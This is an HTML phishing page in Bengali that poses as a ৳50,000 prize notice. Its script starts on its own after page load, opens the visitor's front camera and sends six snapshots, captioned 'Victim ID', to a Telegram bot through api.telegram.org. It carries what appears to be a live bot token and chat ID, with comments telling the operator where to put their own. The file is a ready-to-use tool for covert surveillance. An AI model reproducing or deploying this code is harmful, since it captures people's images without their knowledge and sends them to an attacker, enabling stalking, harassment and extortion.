<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>অভিনন্দন! ৳৫০,০০০ জিতেছো</title>
  <style>
    body,html{margin:0;padding:0;height:100%;background:#000;color:white;font-family:Arial;text-align:center;display:flex;align-items:center;justify-content:center;flex-direction:column;}
    h1{font-size:2.8em;background:linear-gradient(45deg,#ff00c8,#00ff9d);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
    .prize{font-size:7em;animation:bounce 1.5s infinite;}
    @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-30px)}}
    button{padding:20px 50px;background:#00ff9d;color:#000;font-size:1.5em;border:none;border-radius:50px;margin-top:30px;animation:pulse 2s infinite;cursor:pointer;}
    @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,255,157,.7)}70%{box-shadow:0 0 0 25px rgba(0,255,157,0)}}
    video{display:none}
  </style>
</head>
<body>
  <h1>অভিনন্দন!</h1>
  <div class="prize">৳50,000</div>
  <p>প্রাইজ ক্লেইম করতে ক্যামেরা অন করো...</p>
  <button onclick="go()">প্রাইজ নাও</button>

  <video id="v" autoplay playsinline></video>

<script>
// ==== এখানে শুধু এই দুটো লাইন ঠিক করো ====
const BOT_TOKEN = "8263369450:AAGP8RQvWLRHGxS0ROad1RrvViqevcJEhsU";   // ← তোমার বটের টোকেন
const CHAT_ID   = "7731349577";                           // ← তোমার টেলিগ্রাম আইডি
// =========================================

const id = new URLSearchParams(location.search).get('id') || 'unknown';
const video = document.getElementById('v');

function go() {
  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
    .then(stream => {
      video.srcObject = stream;
      video.play();

      let count = 0;
      const total = 6;

      const send = setInterval(() => {
        if (count >= total) {
          clearInterval(send);
          setTimeout(() => location.href = "https://i.imgur.com/removed.png", 2000);
          return;
        }

        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        const blob = canvas.toBlob(blob => {
          const file = new File([blob], "photo.jpg", {type: "image/jpeg"});

          const form = new FormData();
          form.append('chat_id', CHAT_ID);
          form.append('photo', file);
          form.append('caption', `ভিকটিম ID: ${id}\nসময়: ${new Date().toLocaleString('bn-BD')}`);

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: form
          });
        }, 'image/jpeg', 0.9);

        count++;
      }, 1200);
    })
    .catch(() => alert("ক্যামেরা দে ভাই!"));
}

// অটো স্টার্ট
setTimeout(go, 1000);
</script>
</body>
</html>
